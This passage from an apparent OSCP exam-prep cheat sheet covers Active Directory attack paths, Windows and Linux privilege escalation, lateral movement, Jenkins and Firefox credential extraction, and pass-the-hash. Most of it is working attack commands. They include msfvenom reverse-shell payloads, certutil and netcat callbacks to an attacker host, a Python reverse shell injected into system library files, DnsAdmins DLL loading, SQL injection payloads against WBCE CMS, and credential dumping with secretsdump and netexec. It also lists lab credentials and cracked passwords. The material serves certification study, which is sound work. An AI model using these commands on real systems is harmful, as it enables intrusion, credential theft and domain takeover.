        running as NT AUTHORITY\SYSTEM (Jenkins service account) →
        dump domain creds from LSASS → get another domain user

  MS02: Lateral movement with new creds → RDP or WinRM →
        low-priv user → AlwaysInstallElevated or PS history contains creds →
        escalate → dump SAM → get local admin hash →
        pass-the-hash to DC

SCENARIO C — Credential Chain Path:
  MS01: Given creds → enumerate SMB shares → find password in file or
        LDAP description → new user's creds →
        that user has SeImpersonatePrivilege → GodPotato → local admin →
        extract more creds

  MS02: RDP with extracted creds → land as standard user →
        PowerShell history reveals admin password → su to local admin →
        mimikatz/secretsdump → DA hash in LSASS (cached logon) →
        DCSync with DA hash

SCENARIO D — ADCS / Delegation Path:
  MS01: Given creds → BloodHound shows GenericWrite over MS02 →
        set SPN → Kerberoast → crack → new creds

  MS02: New creds → WinRM → low priv → check whoami /priv →
        SeBackupPrivilege (Backup Operators group) →
        copy SAM/SYSTEM with backup privilege → crack →
        local admin → enumerate → find ADCS vulnerable template →
        certipy req → get DA cert → authenticate as DA
```

### Windows Local Privesc Techniques IN AD CONTEXT — Quick Check Order

The key insight: on AD machines the privesc is often **credential-based** rather than exploit-based:

```powershell
# ═══ TIER 1: CHECK THESE FIRST (30 seconds each, highest hit rate) ═══

# 1. Token privileges (most common OSCP AD privesc)
whoami /priv
# SeImpersonatePrivilege     → GodPotato (INSTANT WIN)
# SeBackupPrivilege          → Backup SAM/SYSTEM
# SeRestorePrivilege         → Replace service binary
# SeManageVolumePrivilege    → Read any file on disk
# SeTakeOwnershipPrivilege   → Take ownership of any object

# 2. PowerShell history (EXTREMELY common in OSCP AD sets)
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Check ALL users you can access:
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`n=== $($_.DirectoryName) ==="; Get-Content $_ }
# Look for: passwords in commands, runas, net use, Invoke-Command

# 3. Stored/cached credentials
cmdkey /list
# Shows "Target: TERMSRV/DC01" with stored creds? →
runas /savecred /user:domain\admin cmd.exe
# This gives you an admin shell without knowing the password!

# 4. AutoLogon in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"

# ═══ TIER 2: SERVICE-BASED PRIVESC (2-5 minutes each) ═══

# 5. AlwaysInstallElevated (INSTANT WIN if both are 0x1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
# If both return 0x1:
# On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATK LPORT=4444 -f msi -o evil.msi
# Transfer evil.msi to target, then:
msiexec /quiet /qn /i C:\temp\evil.msi

# 6. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# Found one? Check if you can write to the path:
icacls "C:\Program Files\Vulnerable Service\"
# If writable: place your payload as the first word of the unquoted path
# Example path: C:\Program Files\My Service\service.exe
# Drop payload as: C:\Program Files\My.exe → restart service

# 7. Writable service binaries
# Check all running services for writable exe paths:
Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running'} | Select Name,PathName | ForEach-Object { if (Test-Path ($_.PathName -replace '"','').Split('.exe')[0] + '.exe') { icacls (($_.PathName -replace '"','').Split('.exe')[0] + '.exe') } }
# Or use accesschk:
accesschk.exe /accepteula -uwcqv "Everyone" * 2>nul
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" * 2>nul
# If writable: replace binary with reverse shell, restart service:
sc stop VulnService
copy C:\temp\rev.exe "C:\Path\To\service.exe"
sc start VulnService

# 8. DLL hijacking (check for missing DLLs)
# Process Monitor is not on exam, but check known paths:
# If a service tries to load a DLL from a writable directory:
# On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATK LPORT=4444 -f dll -o evil.dll
# Place evil.dll in the writable directory with expected name
# Restart the service

# ═══ TIER 3: CREDENTIAL HUNTING (5-10 minutes) ═══

# 9. Configuration files with passwords
dir /s /b C:\*.config C:\*.ini C:\*.xml C:\*.txt 2>nul | findstr /i "password pass cred"
findstr /si "password" C:\*.xml C:\*.ini C:\*.txt C:\*.config 2>nul
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul

# 10. Scheduled tasks with credentials or interesting binaries
schtasks /query /fo LIST /v | findstr /i "task to run\|run as"
# Writable scheduled task binary? Replace it.

# 11. KeePass database files
dir /s /b C:\*.kdbx 2>nul
# Found one? Transfer to Kali:
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# 12. Internal services (port forward for further exploitation)
netstat -ano | findstr LISTEN
# Internal-only web app? Jenkins? Database?
# Chisel port forward:
# Kali: chisel server -p 8888 --reverse
# Target: chisel.exe client ATTACKER:8888 R:LOCAL_PORT:127.0.0.1:INTERNAL_PORT

# ═══ TIER 4: DOMAIN-SPECIFIC PRIVESC ═══

# 13. Check group memberships for special groups
whoami /groups
net localgroup
net localgroup administrators
net localgroup "Remote Desktop Users"
net localgroup "Backup Operators"
# Backup Operators → backup SAM/SYSTEM:
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
# Server Operators → modify service binaries
# DnsAdmins → inject DLL into DNS service

# 14. Interesting AD-specific files
dir /s /b C:\*.pfx C:\*.pem C:\*.key C:\*.p12 2>nul
# Certificate files may allow ADCS authentication
```

### Lateral Movement Command Reference

```bash
# ═══ FROM KALI (preferred — no tools to transfer) ═══

# PsExec (requires local admin on target, GIVES SYSTEM)
impacket-psexec domain.local/user:'password'@TARGET
impacket-psexec -hashes :NTLM_HASH domain.local/user@TARGET

# WMIExec (requires local admin, gives user shell, more stealthy)
impacket-wmiexec domain.local/user:'password'@TARGET
impacket-wmiexec -hashes :NTLM_HASH domain.local/user@TARGET

# SMBExec (requires local admin, GIVES SYSTEM, uses SMB)
impacket-smbexec domain.local/user:'password'@TARGET

# Evil-WinRM (requires WinRM access + Remote Management Users or admin)
evil-winrm -i TARGET -u user -p 'password'
evil-winrm -i TARGET -u user -H 'NTLM_HASH'

# RDP (interactive, good for GUI apps)
xfreerdp +clipboard /u:domain\\user /p:'password' /v:TARGET /dynamic-resolution /drive:share,/home/kali/tools

# ═══ FROM WINDOWS (when you're already on a domain machine) ═══

# PowerShell Remoting
$cred = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }
# For interactive session:
Enter-PSSession -ComputerName TARGET -Credential $cred

# WMI
wmic /node:TARGET /user:domain\user /password:password process call create "cmd /c C:\temp\nc.exe ATTACKER 4444 -e cmd.exe"

# sc (service control — for creating/starting services)
sc \\TARGET create evil binpath= "C:\temp\nc.exe ATTACKER 4444 -e cmd.exe"
sc \\TARGET start evil

# RDP from inside the network
mstsc /v:TARGET

# RunAs with different creds (from interactive session)
runas /user:domain\newuser /netonly cmd.exe
# /netonly = use new creds for network only, keep current local session
```

### When You're Stuck in the AD Set — Emergency Checklist

```
□ Re-read EVERY nmap output for ALL machines (not just current target)
□ Re-enumerate SMB shares with current creds (new permissions?)
□ Check LDAP descriptions again (you may have more access now)
□ Run BloodHound again, mark all owned users, check shortest paths
□ Try every discovered password against every discovered username (spray matrix)
□ Check for internal web apps you haven't found yet (port scan from inside)
□ Read PowerShell history on EVERY machine you have access to
□ Look for config files in web roots, user desktops, documents folders
□ Try the machine hostname as a password
□ Try username as password for all users
□ Check if you missed a flag (local.txt might be readable even without admin)
□ Check DNS: nslookup -type=any domain.local DC_IP (find hidden hosts?)
□ Port forward internal services and enumerate them from Kali
□ Check C:\Users\Public, C:\Shares, C:\Temp, C:\inetpub\wwwroot
□ Did you try the SAME password on OTHER machines? (password reuse!)
```

---

## 🔧 JENKINS IN AD — The "Impossible" Set Survival Guide

> **The Jenkins AD set is considered the hardest because it requires web app enumeration,
> Groovy exploitation, credential chaining, AND local privesc — all in sequence.**
> **The key: Jenkins is just another foothold vector. Treat it methodically.**

### The Jenkins AD Pattern (Reconstructed from Challenge Lab Reports)

```
TYPICAL FLOW:
  1. You get domain creds → RDP/WinRM to MS01
  2. MS01 has Jenkins running on localhost (8080 or 50000)
     → You can ONLY reach it from MS01, not from your Kali
     → Port forward it: chisel or SSH tunnel
  3. Enumerate Jenkins:
     → Try given domain creds on Jenkins login
     → Try admin:admin, admin:password, admin:jenkins
     → Check if self-registration is enabled (/signup)
     → Check for CVE-2024-23897 (CLI arbitrary file read)
  4. If you get Jenkins access → Script Console → Groovy RCE
     → Shell as the Jenkins service account (often NT AUTHORITY\SYSTEM or a service account)
  5. Harvest credentials from Jenkins:
     → Decrypt stored secrets (credentials.xml + master.key + hudson.util.Secret)
     → Check build logs for hardcoded creds
     → Check build environment variables
  6. Use harvested creds to move to MS02 → local privesc → DC
```

### Jenkins Port Forward (When It's Only on Localhost)

```bash
# From your shell on MS01, Jenkins is on 127.0.0.1:8080
# You need to access it from your Kali browser

# Option 1: Chisel (most reliable)
# On Kali:
chisel server -p 9999 --reverse
# On MS01 (upload chisel.exe first):
chisel.exe client KALI_IP:9999 R:8080:127.0.0.1:8080
# Now browse to http://127.0.0.1:8080 on Kali

# Option 2: SSH tunnel (if SSH is available)
ssh -L 8080:127.0.0.1:8080 user@MS01
# Browse http://127.0.0.1:8080 on Kali

# Option 3: ligolo-ng
# On Kali:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# On MS01:
agent.exe -connect KALI_IP:11601 -ignore-cert
# In proxy console:
session → start → add route
```

### Jenkins Credential Extraction — Step-by-Step

```bash
# AFTER getting a shell on the Jenkins server:

# 1. Find Jenkins home directory
# Windows common paths:
dir C:\Users\*\.jenkins\ 2>nul
dir "C:\ProgramData\Jenkins\.jenkins\" 2>nul
dir "C:\Program Files\Jenkins\" 2>nul
dir "C:\Program Files (x86)\Jenkins\" 2>nul
# Linux:
ls -la /var/lib/jenkins/ 2>/dev/null
ls -la ~/.jenkins/ 2>/dev/null

# 2. Grab the secret files (ALL THREE needed for decryption)
type "C:\Users\admin\.jenkins\secrets\master.key"
type "C:\Users\admin\.jenkins\secrets\hudson.util.Secret"
type "C:\Users\admin\.jenkins\credentials.xml"
# Also check job configs for inline credentials:
dir /s /b "C:\Users\admin\.jenkins\jobs\*\config.xml"

# 3. Transfer all three files to Kali

# 4. Decrypt offline on Kali:
# Tool: https://github.com/gquere/pwn_jenkins
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml

# 5. ALTERNATIVELY — Decrypt from Groovy console (if you still have access):
# Paste in Script Console:
println(hudson.util.Secret.decrypt("{AQAAABAAAAAg...encrypted...}"))
# Find encrypted values in credentials.xml and paste each one

# 6. Check build history for credentials:
# In Jenkins UI → each job → Build History → Console Output
# Look for passwords passed as parameters or environment variables
# Also check: /job/JOBNAME/lastBuild/consoleText
```

### Jenkins Without Script Console Access

```
If you can create/edit jobs but NOT access /script:

1. Create a new Freestyle project (or modify existing)
2. Add Build Step → "Execute Windows batch command"
   Enter: powershell -e <BASE64_REVSHELL>
   Or: certutil -urlcache -split -f http://ATTACKER/nc.exe C:\temp\nc.exe & C:\temp\nc.exe ATTACKER 4444 -e cmd.exe
3. Save → Build Now → Catch reverse shell

If Jenkins uses Pipeline (Jenkinsfile):
  Create a new Pipeline project, paste:
  pipeline {
    agent any
    stages {
      stage('pwn') {
        steps {
          bat 'powershell -e <BASE64>'
        }
      }
    }
  }
```

---

## 🔓 AD PRIVILEGE GROUPS CHEATSHEET — Instant Wins

> **If `whoami /groups` shows any of these, you have a direct path to SYSTEM/DA**

```
GROUP → TECHNIQUE
══════════════════════════════════════════════════════════════

Backup Operators →
  Can backup (read) any file including SAM/SYSTEM/NTDS.DIT
  reg save hklm\sam C:\temp\SAM
  reg save hklm\system C:\temp\SYSTEM
  # Or use wbadmin/diskshadow to backup ntds.dit
  # Transfer to Kali → impacket-secretsdump -sam SAM -system SYSTEM LOCAL

Server Operators →
  Can start/stop/configure services
  sc config VulnSvc binpath= "C:\temp\nc.exe ATTACKER 4444 -e cmd.exe"
  sc stop VulnSvc
  sc start VulnSvc
  # Shell comes back as SYSTEM

DnsAdmins →
  Can load arbitrary DLL into DNS service (runs as SYSTEM)
  # On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATK LPORT=4444 -f dll -o evil.dll
  # Host it: impacket-smbserver share . -smb2support
  dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\evil.dll
  sc \\DC01 stop dns
  sc \\DC01 start dns
  # Shell comes back as SYSTEM on the DC!

Remote Management Users →
  Confirms WinRM/PSRemoting access (not a privesc itself)
  evil-winrm -i TARGET -u user -p pass

Event Log Readers →
  Can read security logs (may contain cleartext creds in old events)
  wevtutil qe Security /rd:true /f:text | findstr /i "password"

Certificate Service DCOM Access →
  May interact with ADCS (check certipy)

Account Operators →
  Can create/modify most user accounts (except admin/DA)
  # Create a user, add to a group you have write access on

GPO Creators Owners →
  Can create GPOs → abuse GPO to push a scheduled task or script
```

### Pass-the-Hash / Pass-the-Ticket Quick Reference

```bash
# ═══ PASS-THE-HASH (use NTLM hash without cracking) ═══

# nxc (test access first)
nxc smb TARGET -u user -H 'NTLM_HASH'
nxc winrm TARGET -u user -H 'NTLM_HASH'

# evil-winrm
evil-winrm -i TARGET -u user -H 'NTLM_HASH'

# impacket
impacket-psexec -hashes :NTLM_HASH domain/user@TARGET
impacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET
impacket-smbexec -hashes :NTLM_HASH domain/user@TARGET

# RDP with hash (restricted admin must be enabled)
xfreerdp /u:user /pth:NTLM_HASH /v:TARGET /dynamic-resolution

# ═══ PASS-THE-TICKET (use Kerberos ticket) ═══

# Export ticket from mimikatz:
sekurlsa::tickets /export

# Or request with impacket:
impacket-getTGT domain/user -hashes :NTLM_HASH -dc-ip DC_IP

# Set ticket in environment:
export KRB5CCNAME=/path/to/ticket.ccache

# Use with impacket (MUST use hostname, not IP):
impacket-psexec -k -no-pass domain/user@DC01.domain.local
impacket-secretsdump -k -no-pass domain/user@DC01.domain.local

# IMPORTANT: Add hostname to /etc/hosts!
echo "DC_IP DC01 DC01.domain.local" >> /etc/hosts
```

---

```
# ═══════════════════════════════════════════════════════
# 🏆 EXAM BATTLE LOG — LESSONS FROM 4 ATTEMPTS
# ═══════════════════════════════════════════════════════

# ──────────────────────────────────────────────────
# EXAM SCORING: AD Set = 40pts | Standalones = 20pts each (60 total) | Bonus = 10pts
# PASS = 70 points
# STRATEGY: AD Set (40) + Bonus (10) + 1 Standalone (20) = 70 ← MINIMUM VIABLE
# ──────────────────────────────────────────────────
```

## 🔑 AD SET PATTERNS (Compromised in multiple practice attempts)

### 🔥 FIREFOX CREDENTIAL EXTRACTION (Compromised .110 in practice attempts AND #3)
```bash
# PATTERN: FTP anonymous → user home dirs → Firefox profiles → SSH creds
# THIS MACHINE APPEARED TWICE — multiple practice attempts (identical: vsftpd 3.0.5 + Apache 2.4.52 + Nicepage 5.4.1)

# Step 1: Anonymous FTP — check for home directories
ftp $IP    # login: anonymous / (blank)
ls -la     # Look for user home dirs: abril, amirah, dax, george, killian, malika, tate, trenton

# Step 2: Find Firefox profiles in home directories
# Look for: .mozilla/firefox/XXXXXXXX.default/ or .mozilla/XXXXXXXX.default/
cd malika/.mozilla    # or whatever user has a Firefox profile
# Download BOTH files (you need BOTH):
get 3ot0ydzb.default/logins.json
get 3ot0ydzb.default/key4.db

# Step 3: Decrypt with firefox_decrypt
# Tool: https://github.com/unode/firefox_decrypt
# Place logins.json and key4.db in a directory mimicking Firefox profile structure:
mkdir -p /tmp/ffprofile
cp logins.json key4.db /tmp/ffprofile/
python3 firefox_decrypt.py /tmp/ffprofile/
# Output: cleartext usernames and passwords for all saved sites

# Step 4: Try ALL extracted passwords on SSH and other services
# In the exam, malika:Anisoptera_Odonata4! gave SSH access
ssh malika@$IP    # Try each extracted password

# ⚠️ Firefox profiles may contain passwords for MULTIPLE sites:
# - SSH/local creds (the goal)
# - Email passwords
# - Web app passwords
# ALL are worth trying on all services!
```

### 🚀 ROCKETCHAT MONGODB EXPLOITATION (Root Privesc on .110)
```bash
# PATTERN: RocketChat (Snap package) → MongoDB on localhost → admin password reset → root

# Step 1: After initial SSH access, enumerate services
ss -tlnp    # Look for MongoDB on 127.0.0.1:27017
ps aux | grep -i rocket    # RocketChat runs as root when installed via snap
snap list    # Confirm rocketchat-server is installed

# Step 2: SSH port forward to access RocketChat web interface
ssh -L 3000:localhost:3000 user@$IP
# Browse to http://localhost:3000 in your browser

# Step 3: Reset admin password via MongoDB
# Snap MongoDB binary location:
/snap/rocketchat-server/x1/bin/mongo

# Connect and reset admin password:
/snap/rocketchat-server/x1/bin/mongo
use rocketchat
# Find admin user:
db.getCollection('users').find({username:"administrator"})
# Reset password to known bcrypt hash (password = "password"):
db.getCollection('users').update({username:"administrator"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
# Reference: https://docs.rocket.chat/docs/restoring-an-admin-user

# Step 4: Login as admin at http://localhost:3000
# RocketChat admin panel → Administration → multiple paths to RCE:
# - Integrations → create webhook with JS reverse shell
# - Admin panel settings may reveal system info
# - RocketChat runs as ROOT → any code execution = root shell

# KNOWN BCRYPT HASHES TO MEMORIZE:
# "password" → $2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG
# Generate your own: python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()))"
```

### 🪟 WINDOWS STANDALONE — FTP PASSIVE MODE FIX (a practice attempt — .111)
```bash
# Microsoft ftpd anonymous login allowed but dir listing TIMES OUT
# This is a passive mode issue with Microsoft FTP
# Fix: Switch to active mode
ftp $IP
passive off    # or "passive" to toggle
ls

# Alternative: Use lftp which handles passive better:
lftp -u anonymous, ftp://$IP
set ftp:passive-mode off
ls

# If still failing, try curl:
curl ftp://$IP/ --user anonymous:anonymous
curl ftp://$IP/ --user anonymous:anonymous --ftp-port -    # active mode
```

### a practice attempt AD Chain (corp.local domain):
```
# 1. kerbrute userenum → found betty, lisa
# 2. Tomcat 8.5 on MS01:8080 → user:user (user=pass!) → /manager/html
# 3. msfvenom WAR deploy → shell as oscp\lisa
# 4. whoami /priv → SeImpersonatePrivilege → GodPotato-NET4
# 5. SAM+SYSTEM exfil via nc → secretsdump LOCAL → admin hash
# 6. netexec --lsa → user:CleartextPassword123 (CLEARTEXT from LSA!)
# 7. Password spray → Pwn3d DC01 + MS02 instantly
# 8. Full domain compromise
```

### a practice attempt AD Chain:
```
# 1. RDP with provided creds (domain_user / DomainPassword123)
# 2. Found C:\Tasks folder with admin-owned automation script
# 3. Scheduled task runs C:\Windows\Logs\task.bat every 1 min (writable!)
# 4. Edited .bat: net user privesc P@ssword123! /add && net localgroup administrators privesc /add
# 5. netexec SAM/LSA/LSASS dump → local admin hash
# 6. Ligolo tunnel to 172.16.120.0/24
# 7. Hash cracked: 1e7650d56ca3ab18bdea7a737c4a7f02 → BrightSunnyDay666
# 8. Lateral movement → DC compromised
```

### AD SET GOLDEN RULES:
```
# ✅ Always try user=password on EVERY service (user:user worked!)
# ✅ Always dump --lsa after getting local admin (cleartext passwords live here)
# ✅ Always check --pass-pol first (Lockout Threshold: None = spray freely)
# ✅ Always check C:\ for unusual folders (C:\Tasks, C:\Scripts, C:\Automation)
# ✅ Always check scheduled tasks: schtasks /query /fo LIST /v
# ✅ Always check writable files in scheduled task paths: icacls <path>
```

### a practice attempt AD Set (MS01 — .101 — NOT compromised):
```
# Nmap: Apache 2.4.54 (Win64) PHP 8.0.26 + FTP + SMB + RDP + WinRM
# Domain: corp.local, Machine: MS01.corp.local
# ⚠️ NEVER TOUCHED — ran out of time after a Linux target standalone
# LESSON: The AD set is worth 40 points. It MUST be prioritized.
# Apache/PHP on Windows = likely web app exploit → shell → pivot
# Look for: WordPress, phpMyAdmin, custom PHP apps, file upload
```

### a practice attempt AD Set (WS01 → DC01 — NOT compromised):
```
# Had RDP creds (domain_user:DomainPassword123) and Ligolo tunnel working
# Enumerated everything but found no path:
#   - ASREPRoast: No vulnerable users
#   - Kerberoasting: No SPNs
#   - Password spray: Failed
# MISSED OPPORTUNITIES:
#   - C:\Windows\Panther\Unattend.xml had AutoLogon for "Admin" (passwords were there!)
#   - PowerShell transcript at C:\output.txt (check for commands revealing creds)
#   - NetNTLMv2 hash captured but not cracked
#   - UAC was DISABLED (EnableLUA=0) — any local admin technique = instant SYSTEM
```

## 🐧 LINUX STANDALONE PATTERN (Compromised in a practice attempt — .110)

### Redis Unauthenticated RCE:
```bash
# Tool: https://github.com/n0b0dyCN/redis-rogue-server
# CRITICAL FIX: Change gb18030 → utf-8 in din() function:
#   Original: return msg.decode('gb18030')
#   Fixed:    try: return msg.decode('utf-8')
#             except UnicodeDecodeError as e: return msg
python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost KALI --lport 21000 --exp exp.so
```

### Python Library Hijacking (Root Privesc):
```bash
# 1. Find writable Python paths:
find /usr/lib/python* -writable -type f 2>/dev/null
find / -writable -type f 2>/dev/null > /tmp/world-writable-files.txt
# 2. Look for cron scripts importing standard modules
# 3. Common hijack targets: base64.py, os.py, subprocess.py, json.py
# 4. Inject reverse shell at TOP of the library file:
#    import socket,subprocess,os;s=socket.socket();s.connect(("KALI",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])
# 5. Wait for cron to execute → root shell
```

## 🪟 WINDOWS STANDALONE LESSONS (a practice attempt — .111 — NOT compromised)

### AES-256 Encrypted ZIP Cracking Workflow:
```bash
# 1. fcrackzip will FAIL on PK compat v5.1 (AES-256) — don't waste time
# 2. unzip will FAIL — needs 7z for AES-256
# 3. CORRECT approach — extract hashes with zip2john, crack with john:
zip2john encrypted.zip > zip_hashes.txt
# 4. If john chokes on multi-hash file, SPLIT into individual hashes:
split -l 1 zip_hashes.txt hash_
for f in hash_*; do john --wordlist=/usr/share/wordlists/rockyou.txt "$f"; done
john --show hash_*
# 5. Extract with 7z (NOT unzip):
sudo apt-get install p7zip-full
7z x -p"password" encrypted.zip
```

### ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED:
```bash
# This means the password IS VALID but EXPIRED — NOT wrong!
# RDP will refuse connection. Try these alternatives:
# 1. PowerShell Web Access: https://TARGET/pswa (check HTTPS port!)
# 2. WinRM: evil-winrm -i TARGET -u user -p 'password'
# 3. Change password first:
smbpasswd -r TARGET -U 'domain/user'
impacket-changepasswd domain/user:oldpass@TARGET -newpass 'NewP@ssw0rd!'
# 4. SMB exec tools (may work despite expired):
impacket-smbexec domain/user:pass@TARGET
impacket-wmiexec domain/user:pass@TARGET
impacket-psexec domain/user:pass@TARGET
```

### RDP Host Key Changed Fix:
```bash
rm ~/.config/freerdp/known_hosts2
# Then reconnect with /cert-ignore or /cert-tofu
```

### PowerShell Web Access (PSWA) — Check on EVERY IIS Box:
```
# Default URL: https://TARGET/pswa
# Login requires: username, password, computer name (try localhost, TARGET hostname)
# SSL cert CN "PowerShellWebAccessTestWebSite" = PSWA is installed!
```

### Email/Document Content Mining:
```
# Emails often contain: default passwords, org charts, IT contacts, service accounts
# Look for: .msg files, .vcf contacts, auto-backup shares
# Key phrases: "default password", "reset password", "access", "credentials"
```

## 🎯 WINDOWS STANDALONE LESSONS (a practice attempt — a target — NOT compromised)

### ⚡ WINDOWS STANDALONE — FIRST 5 MINUTES AFTER FOOTHOLD
```powershell
# Run ALL of these before anything else — this is where your 10 points live:
whoami /priv                    # SeImpersonate? → GodPotato → DONE
whoami /groups                  # Backup Operators? Server Operators? → DONE
cmdkey /list                    # Stored creds? → runas /savecred → DONE
type C:\Windows\Panther\Unattend.xml 2>nul   # Cleartext password? → spray → DONE
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr -i "DefaultPassword"
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "=== $_ ==="; Get-Content $_ }
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

### WBCE CMS SQLi:
```bash
# Vulnerable endpoint: /modules/miniform/ajax_delete_message.php
# Backtick injection in DB_RECORD_TABLE parameter:
# Time-based confirmation:
curl -X POST 'http://TARGET/modules/miniform/ajax_delete_message.php' \
  -d 'DB_RECORD_TABLE=miniform_data`+WHERE+1=1+AND+(SELECT+SLEEP(6))--+'
# Data extraction (UNION):
curl -X POST 'http://TARGET/modules/miniform/ajax_delete_message.php' \
  -d 'DB_RECORD_TABLE=miniform_data`+UNION+SELECT+1,2,3,username,password,email+FROM+wbce_users--+'
# Password reset SQLi:
# email='/**/OR/**/user_id=1/**/OR/**/'admin@domain
# IMPORTANT: Disable redirect following in Burp for these requests
```

### Mercury/32 Mail Server:
```
# Ports: 25/SMTP, 79/Finger, 110/POP3
# Finger can enumerate users: finger @TARGET
# CRAM-MD5 buffer overflow CVE exists — binds shell on port 1154
```

## ⏱️ TIME MANAGEMENT RULES (PRACTICE — UPDATED)

```
PROVEN: You can own AD in ~4 hours (did it in multiple practice attempts)
PROVEN: You can own 1 Linux standalone (did it in multiple practice attempts)
NEEDED: 10 more points (1 local.txt OR 1 proof.txt on any standalone)

Hour 0-0.5:  Full port scan ALL 6 machines + initial enum + /etc/hosts setup
Hour 0.5-4:  AD Set (MUST complete — 40 points) — you've done this, trust the process
Hour 4-4.5:  BREAK. Eat. Walk. You have 40 pts locked in.
Hour 4.5-6:  Standalone #1 — pick the one with clearest web app or known service
Hour 6-6.5:  STUCK CHECK: No shell after 90 min? → MOVE TO STANDALONE #2
Hour 6.5-8.5: Standalone #2 (or continue #1 if you have a foothold)
Hour 8.5-9:  BREAK. Assess: Do you have 70 points yet?
Hour 9-11:   Standalone #3 OR return to stuck machines with fresh eyes
Hour 11-14:  Cleanup, revisit, try creds from other machines on stuck ones
Hour 14+:    Report writing (start IMMEDIATELY once you hit 70+ points)

CRITICAL CHANGES FROM PRACTICE:
- You scored 60 (AD 40 + standalone 20). You need 10 more points.
- With 10 bonus points from labs, you ONLY need local.txt on ONE standalone = PASS
- Do NOT spend 4+ hours on a single standalone — ROTATE after 90 min
```

## 📊 SCORING ANALYSIS ANALYSIS (4 attempts)

```
a practice attempt: AD ✅ (40) + Standalones ❌ (0)   = 40 pts (FAIL)
a practice attempt: AD ❌ (0)  + .110 ✅ (20)          = 20 pts (FAIL)
            → a target had API creds but never tried evil-winrm
            → AD set (MS01) never even started
a practice attempt: AD ❌ (0)  + Standalones ❌ (0)    = 0 pts (FAIL)
            → WS01 had Unattend.xml + UAC disabled + transcript
            → Deep enum paralysis: 100+ checks, 0 exploitation
a practice attempt: AD ✅ (40) + .110 ✅ (20)          = 60 pts (FAIL)
            → Closest attempt, needed 10 more points

🔑 PATTERN: Best score is 60. Need 70 to pass. Gap = 1 standalone local.txt.
WITH 10 BONUS POINTS (from lab exercises): You need AD(40) + bonus(10) + local.txt(10) = 60+10 = 70 ✅
WITHOUT BONUS: You need AD(40) + 1 full standalone(20) + 1 local.txt(10) = 70 ✅
The consistent blocker is getting MORE POINTS from standalones after AD.

🚨 ANTI-PATTERNS TO BREAK:
1. "Enumeration paralysis" — spending 4+ hours enumerating without exploiting
   FIX: If you find creds, TRY THEM ON EVERY SERVICE within 5 minutes
2. "API rabbit hole" — crafting 20 header combinations before trying the obvious
   FIX: Leaked password? evil-winrm / smbclient / rdp FIRST, API second
3. "Skipping the AD set" — standalones are harder to guarantee than AD
   FIX: AD set FIRST, always. 40 pts is the foundation.
4. "Not trying creds on unrelated services" — password from site A often works on SSH/WinRM
   FIX: Every password goes into a master creds list, spray EVERYTHING
```

## 🔧 EXAM DAY QUICK FIXES

### Shell Upgrade (Linux):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

### File Transfer (Windows):
```powershell
# PowerShell download:
iwr -uri http://KALI/file -Outfile file
(New-Object Net.WebClient).DownloadFile('http://KALI/file','C:\file')
certutil -urlcache -f http://KALI/file C:\file
# PowerShell upload:
$b = [System.IO.File]::ReadAllBytes('C:\file'); [Net.WebClient]::new().UploadData('http://KALI/upload','POST',$b)
```

### Potato Attacks (SeImpersonatePrivilege):
```bash
# GodPotato (worked in a practice attempt):
.\GodPotato-NET4.exe -cmd "net user hacker P@ss123! /add"
.\GodPotato-NET4.exe -cmd "net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c C:\path\to\nc.exe KALI PORT -e cmd.exe"
# PrintSpoofer:
.\PrintSpoofer64.exe -c "net user hacker P@ss123! /add"
# SweetPotato, JuicyPotatoNG also options
```

### Credential Dumping After Local Admin:
```bash
# Remote (netexec — preferred):
nxc smb TARGET -u Administrator -H HASH --local-auth --sam
nxc smb TARGET -u Administrator -H HASH --local-auth --lsa
